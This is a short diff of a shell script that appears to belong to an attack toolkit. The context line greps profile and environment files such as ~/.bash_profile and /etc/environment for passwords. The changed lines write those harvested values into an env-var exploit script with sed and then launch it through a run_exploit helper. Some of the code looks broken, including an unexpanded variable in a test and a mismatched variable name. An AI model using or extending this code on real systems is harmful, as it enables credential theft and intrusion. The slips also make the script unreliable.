@@ -22,8 +22,9 @@ exploitable_passwords=$(grep -i 'password' ~/.bash_profile /etc/environment /etc
 # Makes exploitable_passwords accessible to exploit
 if [[ -z exploitable_passwords ]]; then
     # There were no exploitable passwords
-    return
-elif [[ "$EXPLOIT" == 1 ]]; then
+    test $EXPLOIT != 0 && echo "Not exploitable, skipping exploit."
+    exit 0
+else
     sed -i "s#exploitable_passwords\=.*#exploitable_passwords\=${exploitable_paths}#g" exploits/env-var-exploit.sh
-    /bin/bash exploits/env-var-exploit.sh
+    run_exploit "env-var"
 fi
